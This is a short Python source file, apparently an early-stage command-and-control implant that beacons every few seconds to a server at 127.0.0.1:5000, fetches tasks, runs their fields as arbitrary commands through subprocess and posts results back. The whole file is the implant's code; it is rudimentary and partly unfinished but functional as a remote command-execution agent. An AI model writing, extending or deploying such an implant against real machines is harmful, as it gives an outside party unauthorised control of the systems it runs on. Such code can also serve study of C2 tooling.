import time
import requests
import subprocess


def fetch_next_task():
    return requests.get('http://127.0.0.1:5000/next_task')


# Might rename this execute
def parse_task(task):
    print("PARSE")
    success = True
    command = []
    # Assume we have 4 task_types
    task_type = task["task_type"]
    if task_type == "ping":
        command.append(task_type)
    # Filter out command args
    for key in task:
        if key not in ["_id", "task_id", "task_type", "task_status"]:
            print(f"{key}: {task[key]}")
            command.append(task[key])
    print(f"command : {command}")
    # Perform task
    print("Performing Task...")
    process = subprocess.run(command, capture_output=True, timeout=30)
    if process.returncode != 0:
        # Set success
        print("error")
        success = False
    print(process.stdout)
    task_result = {"output": process.stdout, "success": success}


def beacon_loop():
    print("Starting beacon loop")
    # task_id = "88c695c6-bf9d-471d-bf31-37545c7ca3e3"
    contents = "response from bot"
    success = True
    # # --------------------------------------------------------------
    # result = requests.post('http://127.0.0.1:5000/results', json=[
    #     {
    #         "task_id": task_id, "contents": contents, "success": success
    #     }
    # ])
    # print(result.json())
    # # --------------------------------------------------------------
    while True:
        time.sleep(5)
        print("Looping")
        # 1. Fetch next task
        task = fetch_next_task()
        json = task.json()
        if task.status_code != 200:
            print(f"INFO: {json['error']}")
            continue
        # 2. Parse Task
        print(json)
        parse_task(json)
        # 3. Execute Task
        pass
        # 4. POST results
        result = requests.post('http://127.0.0.1:5000/results', json=[
            {
                'task_id': json['task_id'], 'contents': contents, 'success': success
            }
        ])
        print(f"POST Result {result}")
        time.sleep(10)


if __name__ == '__main__':
    beacon_loop()
